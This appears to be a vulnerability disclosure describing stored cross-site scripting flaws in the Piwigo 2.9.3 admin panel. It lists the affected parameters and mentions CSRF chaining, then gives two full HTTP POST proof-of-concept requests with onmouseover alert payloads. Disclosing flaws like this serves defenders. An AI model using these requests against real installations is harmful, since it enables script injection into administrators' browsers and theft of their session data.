# Stored XSS Vulnerabilities in Piwigo 2.9.3
The management panel of the Piwigo application contains multiple storage type XSS. An attacker can use these vulnerabilities to obtain data from the client's browser side.

### Instance：
/ws.php?format=json POST:name=

/admin.php?page=cat_list POST:virtual_name=

/admin.php?page=photo-${photo_number} POST:name=

Because some exploit do not require token authentication, you can work with CSRF.
### Proof of Concept:
Requst:
```
POST /piwigo-2.9.3/ws.php?format=json HTTP/1.1
Host: 127.0.0.1
Content-Length: 88
Accept: application/json, text/javascript, */*; q=0.01
Origin: http://127.0.0.1
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: http://127.0.0.1/piwigo-2.9.3/admin.php?page=photos_add
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: pwg_id=7p8s8ph7rd5q628nhst60qtr72; Phpstorm-dbfe371a=74b16478-2f39-480e-81ad-b2d796746e3b; goods[cart]=180129111198995248; csrftoken=Xm7EJbv8bGscval7HvWsnZvRpX5rTcY8ev7b1ljZZ7GBRqjcB0U6MHDiYz8A2L7S; Hm_lvt_3155433929be1afd6cef849b9709d4d7=1520073895
Connection: close

method=pwg.categories.add&parent=0&name=%3Ca+onmouseover%3Dalert(1)%3Exxs_link%3C%2Fa%3E
```
Response:
![](https://github.com/summ3rf/Vulner/blob/master/image/20180306114101.png)


Request:
```
POST /piwigo-2.9.3/admin.php?page=photo-1 HTTP/1.1
Host: 127.0.0.1
Content-Length: 182
Cache-Control: max-age=0
Origin: http://127.0.0.1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://127.0.0.1/piwigo-2.9.3/admin.php?page=photo-1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: pwg_id=7p8s8ph7rd5q628nhst60qtr72; 
Connection: close

name=%3Ca+onmouseover%3Dalert%281%29%3Etitle%3C%2Fa%3E&author=&date_creation=&associate%5B%5D=11&represent%5B%5D=11&tags%5B%5D=%7E%7E1%7E%7E&description=&level=0&submit=Save+Settings
```
Response:
![](https://github.com/summ3rf/Vulner/blob/master/image/20180306120939.png)


